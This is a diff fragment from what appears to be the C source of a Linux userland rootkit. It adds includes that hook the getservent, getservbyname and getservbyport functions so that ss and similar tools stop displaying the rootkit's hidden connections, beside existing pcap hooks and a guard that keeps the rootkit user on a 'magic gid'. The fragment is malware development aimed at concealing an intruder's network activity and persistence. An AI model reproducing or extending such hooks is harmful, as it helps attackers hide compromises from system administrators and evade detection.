@@ -264,6 +264,11 @@
 #include "symbols/pcap/pcap.h"
 #include "symbols/pcap/pcap.c"
 
+// stop ss (and other similar tools) from displaying our hidden connections
+#include "symbols/servent/getservent.c"
+#include "symbols/servent/getservbyname.c"
+#include "symbols/servent/getservbyport.c"
+
 // gid related stuff, make it impossible for the rk user to change their gid from the magic gid
 // just a safe-guard :)
 // http://linux.die.net/man/2/setgid
